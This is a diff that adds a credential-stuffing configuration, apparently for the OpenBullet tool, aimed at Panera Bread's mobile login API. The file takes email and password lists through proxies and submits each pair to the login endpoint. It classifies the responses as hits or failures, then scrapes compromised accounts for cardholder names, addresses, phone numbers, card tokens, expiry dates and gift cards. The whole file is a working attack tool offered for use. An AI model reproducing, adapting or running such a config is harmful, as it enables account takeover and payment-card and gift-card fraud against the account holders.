@@ -1,0 +1,63 @@
+[SETTINGS]
+{
+  "Name": "Panera",
+  "SuggestedBots": 15,
+  "LastModified": "2018-10-03T12:30:36.1485868+00:00",
+  "AdditionalInfo": "|EXP#2 is CC EXP | Captures Credit card + GiftCard | US PROXIES |",
+  "Author": "suffocate",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "None",
+  "DataRules": [
+    {
+      "SliceName": "USER",
+      "RuleType": 2,
+      "RuleString": "6",
+      "Id": 1969412252
+    },
+    {
+      "SliceName": "PASS",
+      "RuleType": 2,
+      "RuleString": "6",
+      "Id": 106703232
+    }
+  ],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#Request REQUEST POST "https://services-mob.panerabread.com/login" AutoRedirect=TRUE 
+  CONTENT "{\"username\":\"<USER>\",\"password\":\"<PASS>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Panera/3.20.1 (iPhone; iOS 10.2.1; Scale/2.00)" 
+  HEADER "Pragma: no-cache" 
+  HEADER "deviceId: A9D58D65-504D-4C59-92EF-DF92615A924D" 
+  HEADER "api_token: bcf0be75-0de6-4af0-be05-13d7470a85f2" 
+#KeyCheck KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Success OR 
+    KEY "customerId" 
+  KEYCHAIN Failure OR 
+    KEY "Invalid login credentials" 
+  KEYCHAIN Ban OR 
+    KEY "Denied" 
+#CCTYPE PARSE "<SOURCE>" LR "\"creditCardType\":\"" "\"," Recursive=FALSE -> CAP "|TYPE" "" "" 
+#CardHolder PARSE "<SOURCE>" LR "\"cardholderName\":\"" "\"," Recursive=FALSE -> CAP "|CardHolder" "" "" 
+#Address PARSE "<SOURCE>" LR "\"addressLine1\":\"" "\"," Recursive=FALSE -> CAP "|Address" "" "" 
+#City PARSE "<SOURCE>" LR "\"city\":\"" "\"," Recursive=FALSE -> CAP "|City" "" "" 
+#State PARSE "<SOURCE>" LR "\"state\":\"" "\"," Recursive=FALSE -> CAP "|State" "" "" 
+#Zip PARSE "<SOURCE>" LR "\"zip\":\"" "\"," Recursive=FALSE -> CAP "|Zip" "" "" 
+#PHONE PARSE "<SOURCE>" LR "\"phoneNumber\":\"" "\"," Recursive=FALSE -> CAP "|Phone" "" "" 
+#CCNUM PARSE "<SOURCE>" LR "\"token\":\"" "\"," Recursive=FALSE -> CAP "|CC" "" "" 
+#EXP PARSE "<SOURCE>" LR "\"expirationDate\":\"" "\"," Recursive=TRUE -> CAP "|EXP" "" "" 
+#GiftCard PARSE "<SOURCE>" LR "\"giftCards\":[" "]," Recursive=FALSE -> CAP "|GiftCard" "" "" 
